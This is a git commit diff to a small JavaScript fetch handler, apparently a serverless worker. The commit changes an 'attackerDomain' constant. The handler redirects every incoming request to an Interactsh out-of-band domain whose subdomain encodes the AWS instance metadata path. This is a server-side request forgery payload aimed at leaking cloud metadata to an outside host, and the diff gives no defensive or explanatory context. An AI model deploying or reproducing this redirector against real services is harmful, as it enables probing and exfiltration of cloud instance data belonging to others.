410806f5ffb9ebabfca365cf371b027155c52260
Unknown_tht <65358061+shripad5258@users.noreply.github.com>
2025-03-06 01:09:42 +0530

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ export default {
   async fetch(request) {
     // Step 1: Redirect to AWS metadata path encoded in the DNS subdomain
     const awsPath = "169-254-169-254-latest-meta-data-hostname"; // DNS-safe format
-    const attackerDomain = "bjgibppjensgmxvguqwdftr10a8zk0m5d.oast.fun"; // Your Interactsh domain
+    const attackerDomain = "bjgibppjensgmxvguqwdo8l6ka1vo9c8n.oast.fun"; // Your Interactsh domain
     return Response.redirect(`http://${awsPath}.${attackerDomain}`, 302);
   }
 };
